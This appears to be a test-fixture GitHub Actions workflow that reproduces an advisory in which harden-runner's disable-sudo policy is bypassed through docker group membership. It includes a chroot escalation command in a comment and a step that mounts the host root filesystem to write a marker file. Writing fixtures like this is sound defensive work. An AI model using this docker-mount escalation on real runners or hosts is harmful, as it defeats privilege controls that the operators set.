@@ -1,0 +1,30 @@
+# GHSA-mxr3-8whj-j74r: disable-sudo policy bypassed via docker group
+# Advisory: https://github.com/advisories/GHSA-mxr3-8whj-j74r
+# Affected Action: step-security/harden-runner
+# Vulnerability Type: Privilege Escalation (Runtime)
+# Expected Detection Rule: Not detectable by static analysis (runtime behavior)
+
+name: GHSA-mxr3-8whj-j74r Vulnerable Pattern
+on:
+  pull_request:
+
+jobs:
+  vulnerable:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Harden Runner with disable-sudo
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+          disable-sudo: true
+
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Vulnerability: Even with disable-sudo: true, the runner can still
+      # execute privileged commands via docker group membership
+      # Example: docker run -v /:/host alpine chroot /host
+      - name: Execute privileged command via docker
+        run: |
+          # This bypasses disable-sudo policy
+          docker run --rm -v /:/host alpine sh -c "echo 'Privileged access via docker' > /host/tmp/pwned"
